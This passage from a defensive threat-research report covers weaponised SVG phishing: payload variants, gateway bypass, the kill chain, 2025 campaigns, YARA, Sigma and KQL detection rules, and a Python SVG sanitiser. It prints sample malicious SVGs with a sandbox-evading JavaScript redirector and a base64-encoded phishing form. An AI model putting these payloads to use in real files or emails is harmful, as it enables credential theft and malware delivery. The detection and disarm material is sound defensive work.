  <!-- Base64 decodes to: window.location='https://phishing.com' -->
</svg>
```

---

### 3.2 Payload Delivery Methods — All Four Variants

**Variant A: Pure JavaScript Redirector** (most common — VMRay, Cloudflare)

The SVG contains no graphical elements whatsoever. It is 100% JavaScript disguised with `.svg` extension.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1">
  <script>
    // Victim email pre-encoded for tracking
    var victim_id = "dXNlckBjb21wYW55LmNvbQ=="; // base64(user@company.com)
    var target = "https://login-m365-secure[.]com/?ref=" + victim_id;
    
    // Check for automated analysis environments
    if (navigator.webdriver || !navigator.plugins.length) {
      window.location.href = "https://microsoft.com"; // Redirect bots to benign
    } else {
      window.location.href = target;
    }
  </script>
</svg>
```

**Variant B: Self-Contained Phishing Form** (no external resources until submission)

The entire phishing experience — HTML, CSS, JavaScript, brand assets — is Base64-encoded inside the SVG and rendered locally in the browser DOM. Most dangerous for offline detection.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Full Microsoft 365 login form, encoded and decoded client-side
    var page = atob("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHRpdGxlP...");
    document.open();
    document.write(page);
    document.close();
  </script>
</svg>
```

**Variant C: Multi-Stage Malware Dropper** (IBM X-Force confirmed, Nov 2025)

Used in the financial institution targeting campaign. The SVG drops a ZIP archive containing a JavaScript file that loads a Java-based RAT chain.

```
SVG opened in browser
  → JavaScript executes
    → document.createElement('a') + click() → downloads Case_No.86-2025.zip
      → ZIP contains JAR file (Java downloader)
        → Checks if Java Runtime present
          → If yes: downloads Blue Banana RAT + SambaSpy + SessionBot
          → C2 via Amazon S3 + Telegram Bot API (blends with legitimate traffic)
```

**Variant D: Redirect Chain with Cloudflare Gate** (Seqrite, GBHackers, Aug 2025)

SVG → redirect to Cloudflare CAPTCHA-gated page → hyper-realistic M365 login → real-time credential validation against Microsoft APIs → exfiltration → optional secondary malware stage

---

### 3.3 Email Gateway Bypass Mechanics

**Why major gateways miss SVG payloads (Ontinue, OPSWAT, Cloudflare analysis):**

| Gateway Behaviour | Why It Fails Against SVG |
|-----------------|-------------------------|
| **MIME type filtering** | Blocks `application/javascript`, `text/html`, `application/octet-stream`. Allows `image/svg+xml`. |
| **Extension blocklists** | Blocks `.exe`, `.js`, `.html`, `.zip`, `.msi`. SVG not on list for most configurations. |
| **Static content analysis** | Looks for known malware signatures in file content. SVG JavaScript is trivially obfuscated with Base64, ROT13, XOR, AES. Hash-based detection fails entirely due to per-recipient mutation. |
| **Sandboxing** | Requires browser rendering to detonate. Many sandboxes use static analysis or simplified rendering engines that don't fully execute embedded SVG JavaScript. Attackers add bot/sandbox detection to further evade automated analysis. |
| **Link analysis** | No external URL in the SVG file (Variant B) means link reputation checks return nothing. |

**SPF/DKIM bypass:** Ontinue (Oct 2025) documented campaigns using spoofed or impersonated email senders with weak/misconfigured SPF, DKIM, and DMARC — or sending from compromised high-reputation accounts that pass all authentication checks entirely.

**Per-recipient mutation:** Like polymorphic phishing email bodies, SVG files are mutated per recipient:
- Random hidden bytes appended to defeat hash detection
- Victim email addresses Base64-encoded within the SVG for pre-fill tracking
- Double extension filenames: `Invoice_2025.xls.svg`, `Bullhost_PO2025-789.xls .svg`
- Dynamic file naming: `New Received FAX -REF[randomNumber].svg`

---

### 3.4 Complete Kill Chain

```
STAGE 1 — DELIVERY
  Email with SVG attachment (direct or link to cloud-hosted file)
  OR: Dropbox / Google Drive / OneDrive link to SVG
  OR: Compromised WordPress site serving SVG on trusted domain
  Subject: "Invoice #IN-2025-0847 — Action Required"
  Attachment: "Invoice_April2025.pdf.svg" (double extension)
  
STAGE 2 — LURE BYPASS
  Email gateway checks MIME type: image/svg+xml → PASS
  AV checks extension: .svg → low priority → PASS
  Static analysis: Base64/XOR obfuscated content → no signature match → PASS
  
STAGE 3 — EXECUTION TRIGGER
  User opens attachment → OS launches default browser (no dedicated SVG viewer on Windows)
  OR: Email previewed in OWA/Outlook Web → browser rendering engine executes SVG JS
  (Zero-click variant: JS executes on email preview with NO user attachment click)
  
STAGE 4 — SANDBOX/BOT EVASION
  SVG JS checks navigator.webdriver, plugins.length, screen dimensions
  Bot/sandbox detected → redirect to microsoft.com (benign) → analysis fails
  Real user detected → proceed to payload
  
STAGE 5 — PAYLOAD DELIVERY (three paths)
  Path A (Redirect): window.location.href to phishing page
    → Target: Cloudflare CAPTCHA gate → M365 credential harvest → exfil to attacker
  Path B (Inline form): Decode full HTML form from Base64 → render locally
    → User enters credentials → POST to attacker server → no external URL seen
  Path C (Dropper): Download JAR/ZIP → Java RAT chain (IBM X-Force variant)
    → Blue Banana RAT + SambaSpy → Telegram/S3 C2

STAGE 6 — EXFILTRATION
  Credential harvesting: Real-time validation against Microsoft/Google APIs
  Malware: C2 via Telegram Bot API or Amazon S3 (blends with legitimate traffic)
  Tracking: Base64-encoded victim email in redirect URL enables per-victim analytics
  
STAGE 7 — PERSISTENCE (advanced variants)
  Browser extension installation, sync-enabled persistence across reboots
  (360 Privacy, Aug 2025: OWA-triggered SVGs targeted browser-based long-lived persistence)
```

---

### 3.5 Confirmed 2025 Campaigns

| Campaign | Date | Attacker | Targets | Payload | SVG Method | Source |
|----------|------|----------|---------|---------|-----------|--------|
| Global financial SVG dropper | Tracked throughout 2025 | Unknown (financially motivated) | Financial institutions worldwide | Blue Banana RAT, SambaSpy, SessionBot | ZIP drop via SVG JS; C2 via Amazon S3 + Telegram | IBM X-Force |
| Microsoft 365 OWA zero-click | Jul–Aug 2025 | Unknown | Enterprise M365 users | Credential harvest + browser persistence | JS embedded in SVG; executes on email preview in OWA | 360 Privacy |
| M365 credential harvest (Ontinue) | Jul 2025 | Unknown | Enterprise (M365) | Credential harvest | SVG redirector to fake M365 login | Ontinue/GitHub IOC release |
| Financial sector DocuSign chain | 2025 ongoing | PhaaS kit users | Financial services | Credential harvest | SVG → DocuSign spoof → Outlook login form (two-hop redirect) | VMRay |
| SWIFT-themed banking lures | 2025 | Unknown | Banks (global) | STRRAT + SambaSpy | SVG → JAR downloader (STRRAT download) | IBM X-Force |
| Agent Tesla via SVG | 2025 | Multiple | General enterprise | Agent Tesla keylogger | SVG attachment email delivery | Cofense, AhnLab |
| XWorm delivery | 2025 | Unknown | Varied | XWorm RAT | SVG + HTML smuggling chain combined | Multiple researchers |

---

### 3.6 Zero-Click OWA Variant — Most Dangerous

**Documented by 360 Privacy Cyber Security Team (August 2025) — this is the most significant SVG development of 2025:**

- **Attack vector:** Email containing SVG-embedded JavaScript inside an HTML wrapper attachment
- **Trigger:** JavaScript executes **when the email is previewed in Outlook Web App (OWA)** in a Chromium-based browser. No attachment click. No user interaction beyond opening the email.
- **Authentication bypass:** Despite appearing to come from internal `user@domain.com` addresses, SPF, DKIM, and DMARC all **fail** — indicating spoofed sender headers
- **Payload:** `atob()` decoding chains with browser-based execution, redirecting to credential harvesting domains
- **Advanced evasion:** 
  - Fingerprints browser environment to detect sandboxed/automated analyzers
  - URLs sometimes resolve only from browser-based headless traffic — cURL/wget won't trigger the payload
  - Targets long-lived browser persistence (Chrome sync) rather than just credential theft

**IOC patterns from 360 Privacy:**
```
# Suspicious Chrome launch flags indicating browser abuse:
"chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService 
             --service-sandbox-type=none --disable-quic

# Outlook temp cache path indicating SVG execution from preview:
C:\Users\[user]\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\...

# Detection: atob() in HTML attributes with onerror chains
Pattern: atob(this.dataset.XYZ) in SVG attributes
Pattern: eval(atob('...')) in <script> or event handlers
Pattern: Long onerror chains in <image> tags
```

---

### 3.7 Detection Rules

**YARA Rule — Malicious SVG (Stairwell, Dec 2025, extended with 2025 campaign patterns):**

```yara
rule Malicious_SVG_Phishing_2025 {
  meta:
    description = "Detects weaponised SVG files used in phishing (2025 campaigns)"
    author = "Synthesised from Stairwell, VMRay, OPSWAT research"
    date = "2025-12"
    mitre_attack = "T1027.017"
    reference = "stairwell.com, vmray.com, opswat.com"
  
  strings:
    // SVG file marker
    $svg_header = "<svg" nocase ascii
    
    // JavaScript execution methods
    $script_tag   = "<script" nocase ascii
    $foreign_obj  = "<foreignObject" nocase ascii
    $onerror      = "onerror=" nocase ascii
    $onload       = "onload=" nocase ascii
    
    // Payload delivery markers
    $base64_data  = "data:text/html;base64," nocase ascii
    $atob_call    = "atob(" nocase ascii
    $eval_atob    = "eval(atob(" nocase ascii
    
    // Redirection / exfiltration
    $window_loc   = "window.location" nocase ascii
    $fetch_call   = "fetch(" nocase ascii
    $xhr_open     = "XMLHttpRequest" nocase ascii
    $form_submit  = "form.submit" nocase ascii
    
    // Known obfuscation patterns
    $cryptojs     = "CryptoJS" ascii
    $rot13        = "ROT13" nocase ascii
    $xor_decode   = "charCodeAt" ascii       // XOR loop pattern
    
    // Suspicious file naming patterns (string in filename context)
    $double_ext1  = ".xls.svg" nocase ascii
    $double_ext2  = ".pdf.svg" nocase ascii
    $double_ext3  = ".xlsx.svg" nocase ascii
    
    // Sandbox evasion
    $webdriver_check = "navigator.webdriver" ascii
    $plugin_check    = "navigator.plugins.length" ascii

  condition:
    $svg_header and (
      // Direct script with active content
      ($script_tag and (1 of ($window_loc, $fetch_call, $xhr_open, $form_submit, $eval_atob))) or
      
      // ForeignObject embedded HTML
      ($foreign_obj and $base64_data) or
      
      // Event handler with decode chain
      (($onerror or $onload) and ($atob_call or $eval_atob)) or
      
      // Obfuscation with network activity
      ($cryptojs or $rot13) or
      
      // Double extension (filename context)
      (1 of ($double_ext1, $double_ext2, $double_ext3)) or
      
      // Sandbox evasion = explicit malicious intent
      ($webdriver_check or $plugin_check)
    )
}
```

**Sigma Rule — Email Gateway: SVG Attachment with Script Content:**
```yaml
title: SVG_Attachment_Contains_Script_Content
id: e7a23bc1-9f81-4d2a-b8c9-1e5f3a9d0e45
status: experimental
description: Detects inbound email with SVG attachment containing JavaScript execution patterns
logsource:
  category: email
  product: exchange
detection:
  selection_attachment:
    Attachment.FileExtension|contains:
      - '.svg'
  selection_content:
    Attachment.Content|contains:
      - '<script'
      - 'foreignObject'
      - 'eval(atob'
      - 'window.location'
      - 'navigator.webdriver'
      - 'onerror='
  condition: selection_attachment and selection_content
falsepositives:
  - Legitimate SVG files from design tools (Figma exports, icon libraries)
  - Marketing emails with animated SVG banners
level: high
tags:
  - attack.initial_access
  - attack.t1566.001
  - attack.defense_evasion
  - attack.t1027.017
```

**Microsoft Defender for Office 365 — Policy Mitigation:**
```
# Block SVG attachments at policy level:
Protection Policies → Anti-Malware → 
  Common Attachment Filter → Add: svg
  Action: Reject message with NDR

# Zero-hour Auto Purge (ZAP) for post-delivery:
Anti-Phishing Policies → 
  Enable ZAP for phishing messages: On
  
# Strict preset security policy recommended for high-value users
```

**KQL — Sentinel: SVG Execution from OWA (Zero-Click variant):**
```kql
// Detect SVG JavaScript execution triggered from Outlook temp cache
DeviceProcessEvents
| where InitiatingProcessFileName in~ ('chrome.exe', 'msedge.exe')
| where InitiatingProcessCommandLine contains 'Content.Outlook'
    or InitiatingProcessCommandLine contains 'INetCache'
| where ProcessCommandLine contains_any ('svg', 'atob', 'eval')
    or FileName in~ ('cmd.exe', 'powershell.exe', 'mshta.exe')
| where Timestamp > ago(7d)
| project Timestamp, DeviceName, AccountName, 
          InitiatingProcessCommandLine, ProcessCommandLine
| order by Timestamp desc
```

---

### 3.8 Chaining with Other Techniques

SVG phishing is most dangerous when chained with other techniques. Confirmed chains from 2025 research:

**Chain 1: SVG + TPA (Trusted Platform Abuse)**
```
Spoofed DocuSign email
  → SVG attachment (appears as signed document preview)
    → Opens in browser → redirects to Cloudflare Worker
      → Cloudflare serves legitimate-looking gate → credential harvest
```

**Chain 2: SVG + AiTM (Adversary-in-the-Middle)**
```
SVG file opened in browser
  → Redirects to Tycoon 2FA reverse proxy endpoint
    → Victim sees real Microsoft 365 login (proxied live)
      → Session cookie captured → MFA bypassed
```

**Chain 3: SVG + ClickFix**
```
SVG file containing foreignObject with HTML
  → Renders fake "browser update required" page
    → Instructs user to paste "verification command" into Run dialog
      → ClickFix payload executes → Lumma Stealer
```

**Chain 4: SVG + Quishing (QR in SVG)**
```
SVG attachment that renders a QR code image
  → QR code links to phishing page
    → Double bypass: SVG bypasses attachment scan, QR bypasses URL reputation
```

**Chain 5: SVG + Zero-Click + Persistence (most sophisticated)**
```
Email previewed in OWA
  → SVG JS executes with zero user interaction
    → Fingerprints browser → installs malicious extension
      → Extension persists via Chrome Sync across devices/reboots
```

---

## Cross-Vector Comparison

| Dimension | ClickFix | Browser-in-the-Browser | SVG Phishing |
|-----------|----------|----------------------|-------------|
| **User action required** | Yes — keyboard shortcuts | Credentials entry | Minimal — file open or email preview |
| **Zero-click variant exists** | No | No | **Yes (OWA preview)** |
| **Technical sophistication to build** | Low | Low–Medium | Low |
| **Detection difficulty** | Medium (LOLBin process chain detectable) | Medium (DOM inspection reveals it) | **High (MIME type bypass, obfuscation)** |
| **Email gateway bypass** | Depends on delivery method | N/A (browser-based) | **Strong — MIME type trusted** |
| **Primary payload** | Infostealer, RAT | Credentials | Credentials or full RAT chain |
| **Nation-state adoption** | **High (APT28, Kimsuky, MuddyWater)** | Medium (Ghostwriter) | Growing (IBM X-Force tracking) |
| **PhaaS availability** | High (ErrTraffic, ClearFake) | High (Sneaky 2FA) | Growing (Cloudflare PhaaS kits) |
| **2025 volume trend** | 47% initial access share | Active, growing | **47,000% surge** |
| **Best defensive layer** | EDR process monitoring + GPO | Password manager + drag test | **Block SVG at gateway + CDR** |
| **Open-source detection tool** | ClickGrab (analysis), ClickFix Block (extension) | Enhanced iframe protection extension | YARA rules only; no gateway tool |
| **MITRE ATT&CK** | T1566, T1218.005, T1059.001 | T1566.001, T1185 | **T1027.017** (new 2025 assignment) |

---

## Portfolio Tool Opportunities

Based on this research, three specific gaps have **zero good open-source tooling** and are directly addressable:

### Tool Opportunity 1: ClickFix Defender (Browser Extension)
**Gap confirmed by:** Splunk (ClickGrab is analysis-only), Eye Security (ClickFix Block exists but has pattern-matching limitations)  
**Innovation:** Move beyond keyword matching to structural payload analysis — detect obfuscated commands via: Base64 string detection in clipboard, presence of LOLBin names even when obfuscated, URL patterns in command context  
**Build time:** 1–2 weeks  
**Portfolio value:** Directly addresses the #1 initial access method of 2025

### Tool Opportunity 2: BitB Detector Extension
**Gap confirmed by:** Only `odacavo/enhanced-iframe-protection` exists — minimal documentation, ~50 stars  
**Innovation:** Combine DOM analysis (high z-index iframe containers), URL mismatch detection (displayed domain vs. actual iframe src), and password manager hook (alert when autofill refuses)  
**Build time:** 1–2 weeks  
**Portfolio value:** Addresses PhaaS-enabled technique (Sneaky 2FA) documented in Nov 2025

### Tool Opportunity 3: SVG CDR Microservice
**Gap confirmed by:** No open-source Content Disarm and Reconstruction tool for SVG exists. Commercial CDR tools (OPSWAT MetaDefender) cost thousands.  
**Innovation:** Python microservice that takes SVG input, strips all `<script>`, `<foreignObject>`, event handlers (`onerror`, `onload`), and Base64 decode chains, and outputs a clean static SVG or PNG  
**Build time:** 2–3 weeks  
**Portfolio value:** Addresses a gap explicitly documented by VMRay, OPSWAT, Ontinue, and Cloudflare

```python
# SVG CDR core — Content Disarm and Reconstruct
from lxml import etree
import re, base64

SVG_NS = "http://www.w3.org/2000/svg"
XHTML_NS = "http://www.w3.org/1999/xhtml"

DANGEROUS_ELEMENTS = [
    f'{{{SVG_NS}}}script',
    f'{{{XHTML_NS}}}script',
    f'{{{SVG_NS}}}foreignObject',
]

DANGEROUS_ATTRS = [
    'onload', 'onerror', 'onclick', 'onmouseover', 'onmouseout',
    'onfocus', 'onblur', 'onchange', 'onsubmit', 'href',
]

def disarm_svg(svg_bytes: bytes) -> tuple[bytes, list[str]]:
    """Strip all executable content from SVG. Returns clean SVG + threat report."""
    threats_found = []
    
    try:
        root = etree.fromstring(svg_bytes)
    except etree.XMLSyntaxError:
        return b'', ['Invalid XML — cannot parse SVG']
    
    # Remove dangerous elements
    for tag in DANGEROUS_ELEMENTS:
        for element in root.iter(tag):
            element.getparent().remove(element)
            threats_found.append(f"Removed element: {tag}")
    
    # Remove dangerous attributes from all elements
    for element in root.iter():
        for attr in list(element.attrib.keys()):
            if attr.lower() in DANGEROUS_ATTRS:
                del element.attrib[attr]
                threats_found.append(f"Removed attribute: {attr} from <{element.tag}>")
            # Detect Base64-encoded data payloads in href/xlink:href
            if attr in ('href', '{http://www.w3.org/1999/xlink}href'):
                val = element.attrib[attr]
                if val.startswith('data:text/html') or val.startswith('data:application'):
                    del element.attrib[attr]
                    threats_found.append(f"Removed base64 HTML payload in {attr}")
    
    # Check for JavaScript in text content
    for element in root.iter():
        if element.text and re.search(r'(eval|atob|fetch|window\.location)', 
                                       element.text, re.IGNORECASE):
            threats_found.append(f"Suspicious JS in text content of <{element.tag}>")
            element.text = ''  # Clear content
    
    clean_svg = etree.tostring(root, pretty_print=True, xml_declaration=True, 
                                encoding='UTF-8')
    return clean_svg, threats_found

# Example usage:
if __name__ == '__main__':
    with open('suspicious.svg', 'rb') as f:
        original = f.read()
    
    clean, threats = disarm_svg(original)
    
    if threats:
        print(f"[THREATS DISARMED] {len(threats)} threat(s) removed:")
        for t in threats:
            print(f"  • {t}")
        with open('clean.svg', 'wb') as f:
            f.write(clean)
    else:
        print("[CLEAN] No executable content found in SVG")
```

---

*Sources: Microsoft Security Blog (Aug 2025), Splunk/ClickGrab, Unit 42 (Aug 2025), SentinelOne (May 2025), IBM X-Force (Nov 2025), VMRay (Jul–Aug 2025), Cloudflare Force-One, Eye Security (Oct 2025), CYFIRMA, Virus Bulletin VB2025 (Tilekar), Menlo Security (Feb 2025), Ontinue Threat Research (Jul 2025), 360 Privacy Cyber (Aug 2025), OPSWAT (May 2025), mr.d0x/BITB (GitHub), Malwarebytes (Nov 2025), LevelBlue/SpiderLabs (Feb 2026), Expel, Censys*  
*Compiled February 2026*
